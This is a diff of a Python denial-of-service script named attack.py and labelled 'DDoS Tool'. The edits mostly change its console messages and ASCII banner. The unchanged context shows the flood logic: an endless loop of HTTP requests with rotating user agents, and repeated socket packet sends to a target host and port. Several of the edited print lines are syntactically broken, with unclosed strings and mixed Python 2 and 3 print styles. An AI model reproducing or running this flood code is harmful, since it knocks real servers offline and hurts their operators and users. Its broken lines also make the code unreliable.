@@ -35,7 +35,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mBot is Cracking\033[0m")
+			print("\033[94mAttacking Server\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -49,7 +49,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94mPacket sent! brute attack\033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94mPackets Sent!\033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
@@ -75,13 +75,16 @@ def dos2():
 
 
 def usage():
-	print "\e[1;77m	 ╔╦╗╔╦╗┌─┐╔═╗ \e[0m\n"
-	print "\e[1;77m   ║║ ║║│ │╚═╗ \e[0m\n"
-	print "\e[1;77m  ═╩╝═╩╝└─┘╚═╝ v1.0 \e[0m\n"
+	print "\e[1;93m  ____  ____       ____ \e[0m
+	print "\e[1;93m |  _ \|  _ \  ___/ ___| \e[0m
+	print "\e[1;93m | | | | | | |/ _ \___ \ \e[0m
+	print "\e[1;93m | |_| | |_| | (_) |__) | \e[0m
+	print "\e[1;93m |____/|____/ \___/____/ v1.0 \e[0m\n"
+	print "
+	print "\e[1;92m.::.\e[0m\e[1;77m	DDoS Tool by @thetermuxchoice \e[0m\e[1;92m.::.\e[0m\n\n"
 	
-	print "\n"
-	(''' \e[1;93m :::\e[0m\e[1;77m        Coded by: @thetermuxchoice\e[0m\n"
-        Gmail  : Henrycko.Developer@gmail.com
+	print (''' \033[92m	
+	Coded by: @thetermuxchoice\e[0m\n"
 	GitHub : https://github.com/thetermuxchoice\n
 	Usage  : python3 attack.py [-s] [-p] [-t]
 	-h : Help
